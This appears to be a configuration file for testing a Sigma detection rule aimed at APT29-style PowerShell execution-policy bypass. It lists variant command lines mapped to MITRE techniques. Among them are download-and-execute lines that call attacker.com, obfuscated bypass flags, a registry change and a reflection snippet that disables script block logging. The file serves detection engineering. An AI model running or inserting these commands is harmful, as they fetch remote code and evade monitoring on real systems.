# ===========================
# THÔNG TIN RULE
# ===========================

# Tên rule (dùng để tạo thư mục output)
rule_name = "apt_29_thinktanks_bypass_uac_powershell"

# Sigma Detection Logic
sigma_detection = """
detection:
    selection:
        CommandLine|contains|all:
            - '-noni'
            - '-ep'
            - 'bypass'
            - '$'
    condition: selection
"""

# ===========================
# MITRE ATT&CK TECHNIQUES
# ===========================

mitre_techniques = """
# T1548.002 - Bypass User Account Control

## 1. PowerShell Execution Policy Bypass

### Method 1.1: Standard bypass flags
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Write-Host 'test'"
powershell.exe -ep bypass -nop -c "Write-Host 'test'"
powershell -NoProfile -ExecutionPolicy Unrestricted -Command "Write-Host 'test'"
pwsh.exe -ExecutionPolicy Bypass -NonInteractive -Command "Write-Host 'test'"

### Method 1.2: Short parameter names (obfuscation)
powershell.exe -noni -ep bypass -c "Write-Host 'test'"
powershell -NoNI -EP Bypass -C "Write-Host 'test'"
powershell.exe -NonI -Exec Bypass -Com "Write-Host 'test'"

### Method 1.3: Using environment variables
%COMSPEC% /c powershell -ep bypass -nop -c "Write-Host 'test'"
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command "$env:TEMP"
echo powershell -noni -ep bypass | cmd

---

## 2. Base64 Encoding (T1027.010)

### Method 2.1: Encoded command
powershell.exe -EncodedCommand <base64_payload>
powershell -enc <base64_payload>
powershell.exe -e <base64_payload>

### Method 2.2: Combined with bypass
powershell.exe -nop -ep bypass -enc <base64>
powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64>

---

## 3. String Obfuscation (T1027.013)

### Method 3.1: String concatenation
&('pow'+'ershell') -nop -ep bypass -c "Write-Host 'test'"
&('powershe'+'ll.exe') -ExecutionPolicy Bypass -Command "$PSVersionTable"

### Method 3.2: Variable substitution
$a='powershell'; &$a -ep bypass -c "Write-Host 'test'"
$cmd='ep'; powershell.exe -$cmd bypass -nop -c "Write-Host 'test'"

### Method 3.3: Character replacement
powershell.exe -noni -ep by`pass -c "Write-Host 'test'"
powershell -NoN`I -EP B`yp`ass -C "Write-Host 'test'"

---

## 4. Process Injection / Alternative Execution

### Method 4.1: WMIC
wmic process call create "powershell.exe -ep bypass -nop -c 'Write-Host test'"
wmic /node:localhost process call create "powershell -noni -ep bypass"

### Method 4.2: Start-Process
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep","bypass","-c","Write-Host 'test'"
Start-Process powershell.exe -NoNewWindow -ArgumentList "-noni","-ep","bypass"

### Method 4.3: Invoke-Expression
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
powershell -nop -ep bypass -c "iex (iwr 'http://example.com/script.ps1')"

---

## 5. COM Object Abuse (T1559.001)

### Method 5.1: WScript.Shell
cscript //nologo //e:vbscript -c "CreateObject(\"WScript.Shell\").Run \"powershell -ep bypass\""
wscript.exe script.vbs

### Method 5.2: PowerShell via COM
powershell -c "$c = New-Object -ComObject WScript.Shell; $c.Run('powershell -ep bypass')"

---

## 6. Registry Modification (T1112)

### Method 6.1: Disable ExecutionPolicy via Registry
reg add HKCU\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell /v ExecutionPolicy /t REG_SZ /d Bypass /f
powershell -c "Set-ExecutionPolicy Bypass -Scope CurrentUser -Force"

---

## 7. Script Block Logging Evasion (T1562.002)

### Method 7.1: Disable logging
powershell -c "$GP=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static'); $GP.SetValue($null,$null)"

### Method 7.2: Obfuscated logging bypass
powershell -nop -ep bypass -c "[Reflection.Assembly]::Load(...)"

---

## 8. Alternative PowerShell Hosts

### Method 8.1: PowerShell ISE
powershell_ise.exe -NoProfile -Command "Write-Host 'test'"

### Method 8.2: PowerShell Core (pwsh)
pwsh.exe -NoProfile -ExecutionPolicy Bypass -Command "$PSVersionTable"
pwsh -ep bypass -noni -c "Write-Host 'test'"

---

## 9. Fileless Execution (T1027.011)

### Method 9.1: Direct script execution
powershell -c "Write-Host 'test'; $env:TEMP"
powershell -nop -ep bypass -c "[System.Diagnostics.Process]::Start('calc.exe')"

### Method 9.2: Download and execute
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
powershell -noni -ep bypass -c "curl http://attacker.com/payload.ps1 | iex"

---

## 10. Environment Variable Abuse

### Method 10.1: Using $PSHome
$env:PSHome = 'C:\Windows\System32\WindowsPowerShell\v1.0'; powershell -ep bypass

### Method 10.2: Custom environment variables
$env:EP='bypass'; powershell -ExecutionPolicy $env:EP -Command "Write-Host 'test'"
"""
